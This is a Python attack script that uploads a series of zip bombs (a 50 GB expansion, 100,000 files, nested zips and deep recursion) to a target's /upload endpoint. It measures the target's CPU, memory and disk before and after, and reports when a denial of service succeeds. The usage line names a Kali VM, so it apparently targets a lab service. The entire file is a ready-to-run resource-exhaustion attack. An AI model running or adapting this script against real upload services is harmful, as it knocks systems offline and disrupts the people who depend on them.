#!/usr/bin/env python3
"""
Remote Compression Bomb DOS Attack
"""

import requests
import time
import os
from datetime import datetime

class RemoteDOSAttack:
    def __init__(self, target_ip):
        self.target_url = f"http://{target_ip}:5000"
        self.target_ip = target_ip
    
    def check_target(self):
        print(f"[*] Checking {self.target_url}...")
        try:
            r = requests.get(self.target_url, timeout=5)
            print(f"[+] Target online: {r.json()['service']}")
            return True
        except:
            print(f"[!] Target not reachable")
            return False
    
    def get_status(self):
        try:
            r = requests.get(f"{self.target_url}/status", timeout=3)
            return r.json()
        except:
            return None
    
    def attack(self, bomb_file):
        if not os.path.exists(bomb_file):
            print(f"[!] File not found: {bomb_file}")
            return
        
        size_mb = os.path.getsize(bomb_file) / (1024**2)
        
        print(f"\n{'='*70}")
        print(f"ATTACK: {bomb_file} ({size_mb:.2f} MB)")
        print(f"Target: {self.target_url}")
        print(f"Time: {datetime.now().strftime('%H:%M:%S')}")
        print(f"{'='*70}")
        
        # Baseline
        baseline = self.get_status()
        if baseline:
            print(f"[PRE]  CPU: {baseline['cpu_percent']:.1f}%  |  Memory: {baseline['memory_percent']:.1f}%  |  Disk Free: {baseline['disk_free_gb']:.2f} GB")
        
        # Upload bomb
        print(f"\n[*] Uploading bomb...")
        start = time.time()
        
        try:
            with open(bomb_file, 'rb') as f:
                files = {'file': (bomb_file, f, 'application/zip')}
                response = requests.post(
                    f"{self.target_url}/upload",
                    files=files,
                    timeout=300
                )
            
            duration = time.time() - start
            
            print(f"[+] Response in {duration:.2f}s - Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                print(f"\n[RESULTS]")
                print(f"  Files Extracted: {data.get('files_extracted', 0):,}")
                print(f"  Extracted Size:  {data.get('total_size_gb', 0):.2f} GB")
                print(f"  Expansion Ratio: {data.get('expansion_ratio', 0):.0f}x")
                print(f"  Extract Time:    {data.get('extraction_time', 0):.2f}s")
                
                if data.get('expansion_ratio', 0) > 100:
                    print(f"\n  [!] HIGH EXPANSION DETECTED - BOMB EFFECTIVE!")
            
            elif response.status_code == 507:
                print(f"\n[+++] DOS ACHIEVED - Resource Exhaustion!")
                try:
                    print(f"      {response.json()['message']}")
                except:
                    pass
            
            # Post-attack status
            time.sleep(3)
            post = self.get_status()
            if post:
                print(f"\n[POST] CPU: {post['cpu_percent']:.1f}%  |  Memory: {post['memory_percent']:.1f}%  |  Disk Free: {post['disk_free_gb']:.2f} GB")
                
                # Check if DOS achieved
                if post['memory_percent'] > 85 or post['cpu_percent'] > 90:
                    print(f"\n[+++] DOS ACHIEVED - Target Heavily Stressed!")
            else:
                print(f"\n[+++] DOS ACHIEVED - Target Not Responding!")
                
        except requests.Timeout:
            print(f"\n[+++] TIMEOUT - DOS ACHIEVED!")
        except requests.ConnectionError:
            print(f"\n[+++] CONNECTION LOST - Target Crashed! DOS ACHIEVED!")
        except Exception as e:
            print(f"\n[!] Error: {e}")
        
        print(f"{'='*70}\n")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 remote_attack.py <KALI_VM_IP>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    attacker = RemoteDOSAttack(target_ip)
    
    if not attacker.check_target():
        sys.exit(1)
    
    print("\n[*] Starting attacks in 3 seconds...")
    time.sleep(3)
    
    # Attack with each bomb
    bombs = [
        "massive_bomb.zip",      # 50 GB uncompressed
        "memory_bomb.zip",       # 100k files
        "zip_of_zips.zip",       # Nested bombs
        "deep_nested.zip"        # Deep recursion
    ]
    
    for bomb in bombs:
        attacker.attack(bomb)
        print("[*] Cooling down 10 seconds...\n")
        time.sleep(10)
    
    print("[+] All attacks complete!")